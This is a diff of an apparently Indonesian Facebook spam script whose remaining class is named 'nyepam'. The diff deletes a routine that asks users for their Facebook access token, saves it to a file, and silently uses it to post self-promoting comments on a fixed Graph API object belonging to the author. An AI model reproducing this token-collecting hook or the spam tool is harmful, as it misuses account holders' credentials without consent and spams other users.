@@ -3,37 +3,6 @@ import requests as reek,json,os,time,requests
 req=reek.Session()
 token = open('latip.txt','a')
 os.system('clear')
-def log():
-	os.system('clear')
-	print('Masukan Accsss Token Fb Anda Buat Bot :v')
-	try:
-		t = input('Masukan Access Token Mu > ')
-		token.write(t)
-		token.close()
-		r = requests.get('https://graph.facebook.com/me?access_token='+t)
-		w = json.loads(r.text)
-		print('Name Fb Mu : '+w['name'])
-		time.sleep(2)
-	except KeyError:
-		os.system('rm -rf latip.txt')
-		print('Token Salah!')
-		time.sleep(1)
-		log()
-def bot():
-	os.system('clear')
-	try:
-		t = open('latip.txt','r').read()
-		r = requests.post('https://graph.facebook.com/157336089524444/comments/?message=Latip Ganteng Banget :*&access_token='+t)
-		r2 = requests.post('https://graph.facebook.com/157336089524444/comments/?message=Sumpah Ga Boong&access_token='+t)
-		b = requests.get('https://graph.facebook.com/me?access_token='+t)
-		s = json.loads(b.text)
-		print('Anda Sudah Login Ke Script :)\nNama Fb Kamu : '+s['name'])
-		time.sleep(2)
-	except:
-		print('Anda Belum Login!')
-		time.sleep(1)
-		log()
-bot()
 class nyepam:
 	def __init__(self,_8,_08,_62):
 		self._8,self._08,self._62=_8,_08,_62
